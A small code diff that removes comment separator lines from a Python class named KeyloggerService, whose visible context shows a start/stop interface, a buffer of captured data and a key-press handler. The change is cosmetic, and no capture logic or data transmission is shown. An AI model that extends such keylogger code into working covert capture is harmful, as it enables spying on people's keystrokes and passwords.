@@ -36,8 +36,6 @@ class KeyloggerService:
         self._buffer = []
         self._lock = Lock()
 
-    # -------------------------
-
     def start(self):
 
         if self._running:
@@ -52,8 +50,6 @@ class KeyloggerService:
         self._running = True
 
         return "Keylogger started"
-
-    # -------------------------
 
     def stop(self):
 
@@ -71,8 +67,6 @@ class KeyloggerService:
             self._buffer.clear()
 
         return data
-
-    # -------------------------
 
     def _on_press(self, key):
 
